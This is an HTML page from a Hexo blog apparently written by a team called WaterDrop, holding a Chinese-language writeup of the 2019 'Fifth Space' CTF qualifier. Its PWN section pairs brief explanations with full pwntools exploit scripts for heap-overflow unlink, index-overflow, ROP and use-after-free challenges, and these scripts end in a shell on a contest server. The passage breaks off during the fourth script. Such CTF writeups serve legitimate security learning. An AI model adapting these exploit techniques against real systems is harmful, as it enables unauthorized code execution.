@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="“第五空间”网络安全创新能力大赛线上初赛writeup">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup | 第五空间">
+<meta property="og:url" content="http://yoursite.com/2019/08/29/fifth-space-wp/index.html">
+<meta property="og:site_name" content="Waterdrop">
+<meta property="og:description" content="“第五空间”网络安全创新能力大赛线上初赛writeup">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/17.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/18.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/19.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/20.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/21.png">
+<meta property="og:updated_time" content="2019-08-29T07:01:39.203Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Writeup | 第五空间">
+<meta name="twitter:description" content="“第五空间”网络安全创新能力大赛线上初赛writeup">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/29/fifth-space-wp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/29/fifth-space-wp/">
+
+
+
+
+
+  <title>Writeup | 第五空间 | Waterdrop</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Waterdrop</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/fifth-space-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Waterdrop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Waterdrop">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Writeup | 第五空间</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-29T14:41:23+08:00">
+                2019-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>“第五空间”网络安全创新能力大赛线上初赛writeup</p>
+<a id="more"></a>
+<h1 id="WaterDrop-WriteUp"><a href="#WaterDrop-WriteUp" class="headerlink" title="WaterDrop WriteUp"></a>WaterDrop WriteUp</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h3><p>这道题比较简单，有一个堆溢出，直接修改下一个chunk的size，做一个unlink attack，然后就有任意写，再写到0x602088，之后就可以直接进后门了</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn15'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50015</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'note:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'note:'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Length of note:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Content of note:'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'bbb\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'cc\n'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x69</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0x6020d0</span>+<span class="number">-0x18</span>)+p64(<span class="number">0x6020d0</span><span class="number">-0x10</span>)).ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>)+p64(<span class="number">0x60</span>)+<span class="string">'\0'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'\0'</span>*<span class="number">8</span>+p64(<span class="number">0x602088</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">sl(<span class="string">'2019'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="西来"><a href="#西来" class="headerlink" title="西来"></a>西来</h3><p>题目关了fastbin，然后用一个变量限制了malloc的size，但是在delete的时候有一个下标溢出，可以伪造一个chunk在name和desc那里，之后可以控制is_root变量，然后可以malloc的size就变大了，然后直接unlink attack，就有任意地址读写<br>然后写free_hook为system，直接get shell</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./pwn12')</span></span><br><span class="line">    p=process(<span class="string">'./pwn12'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50012</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Size?'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'5.Exit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index?'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">':'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'5.Exit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index?\n"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index?"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'5.Exit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'what\'s your name?'</span>)</span><br><span class="line">se(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">ru(<span class="string">'what\'s your info?'</span>)</span><br><span class="line">se(p64(<span class="number">0x21</span>)*<span class="number">6</span>+cyclic(<span class="number">0x1d0</span><span class="number">-0x30</span>)+p64(<span class="number">0x6022C1</span>)+p64(<span class="number">0x0000006800000000</span>)+p64(<span class="number">0x6020a0</span>)+p64(<span class="number">0x0000006800000000</span>))</span><br><span class="line">ru(<span class="string">'5.Exit'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">-5</span>)</span><br><span class="line">canary = <span class="string">'\0'</span>+ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">ru(<span class="string">'5.Exit'</span>)</span><br><span class="line">delete(<span class="number">-4</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x6022f0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6022f0</span><span class="number">-0x10</span>)).ljust(<span class="number">0xf0</span>,<span class="string">'\0'</span>)+p64(<span class="number">0xf0</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6022e0</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>)+p64(<span class="number">0x602080</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>)+p64(<span class="number">0x6020A8</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>)+p64(<span class="number">0x6022e0</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)<span class="number">-0x68</span></span><br><span class="line">base = libc<span class="number">-0x3a5610</span></span><br><span class="line">free_hook = base+<span class="number">0x3a77c8</span></span><br><span class="line">system = base+<span class="number">0x41490</span></span><br><span class="line">binsh = base+<span class="number">0x1633e8</span></span><br><span class="line">ru(<span class="string">'5.Exit'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6022e0</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>)+p64(free_hook)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x100</span>)+p64(binsh))</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">"Index?"</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h3><p>栈溢出，直接构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(0,bss,0x3b)</span><br><span class="line">system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn11'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50011</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'please input your name'</span>)</span><br><span class="line">sl(<span class="string">'aaa\n'</span>)</span><br><span class="line">ru(<span class="string">'Let\'s start a game,can you guess the key?'</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x4012ab</span></span><br><span class="line">prsi = <span class="number">0x4012a9</span></span><br><span class="line">puts = <span class="number">0x0401030</span></span><br><span class="line">bss = <span class="number">0x404060</span>+<span class="number">0x100</span></span><br><span class="line">prbp = <span class="number">0x401149</span></span><br><span class="line">leave = <span class="number">0x40124b</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">40</span> +p64(prdi)+p64(<span class="number">0x0404028</span>)+p64(puts)</span><br><span class="line">payload += flat(<span class="number">0x4012A2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x404028</span>,<span class="number">0</span>,bss,<span class="number">0x200</span>,<span class="number">0x0401288</span>,<span class="string">'a'</span>*<span class="number">56</span>)</span><br><span class="line">payload += flat(prbp,bss<span class="number">-8</span>,leave)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line">ru(<span class="string">'fail!\n'</span>)</span><br><span class="line">p_addr = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)</span><br><span class="line">syscall = p_addr+<span class="number">0xe</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0x4012A2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x404028</span>,<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">0x3b</span>,<span class="number">0x0401288</span>,<span class="string">'a'</span>*<span class="number">56</span>)</span><br><span class="line">payload += flat(<span class="number">0x4012A2</span>,<span class="number">0</span>,<span class="number">1</span>,bss+<span class="number">0x100</span>,bss+<span class="number">0x108</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0401288</span>,p64(syscall))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x04012B8</span>)+<span class="string">'/bin/sh\0'</span></span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">se(cyclic(<span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">print(hex(p_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="朝彻"><a href="#朝彻" class="headerlink" title="朝彻"></a>朝彻</h3><p>这题有一个UAF，可以在chunk被free掉之后还继续改，因此可以直接fastbin attack，然后控制另外一个chunk，就有一个任意读写，但是读只能读2个字节，这个就有点难受，所以做法是首先任意写，改got表中的free，改成main函数，这样每次delete的时候，show和edit的次数又恢复了<br>之后leak出libc地址，然后把free又改成system，直接get shell</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 